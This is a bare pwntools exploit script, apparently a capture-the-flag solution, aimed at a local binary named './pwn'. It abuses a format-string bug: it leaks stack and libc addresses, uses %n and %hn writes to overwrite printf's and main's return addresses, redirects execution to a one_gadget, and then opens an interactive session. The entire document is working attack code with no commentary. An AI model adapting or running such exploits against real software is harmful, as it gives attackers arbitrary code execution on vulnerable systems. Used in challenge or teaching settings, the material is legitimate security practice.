from pwn import *
#context.log_level='debug'
#4011B6
#114514
r=process("./pwn")
pause()
r.recvuntil(b"your gift ")
stack=int(r.recvuntil(b"pl")[:-2],16)
r.recvuntil(b"name")

print(hex(stack))
printf_ret=stack-0x8
main_ret=stack+0x68
#"%9$p %10$p %11$p %12$p"
pay1=b"%64c%11$n%4593c%10$hn%3$p".ljust(32,b'a')+p64(printf_ret)+p64(printf_ret+0x2)
r.send(pay1)
r.recv(0x4600)
r.recvuntil(b"0x")
libc_base=int(r.recv(12),16)-0x10E1F2
print(hex(libc_base))

one_gadget=(libc_base+0xe3b01)%0x1000000

pay2=b"%"+str(one_gadget//0x10000).encode("utf-8")+B"c"+b"%11$hhn"+b"%"+str(one_gadget%0x10000-one_gadget//0x10000).encode("utf-8")+b"C"+b"%10$hn"
pay2=pay2.ljust(32,b'a')+p64(main_ret)+p64(main_ret+0x2)
r.send(pay2)

r.interactive()

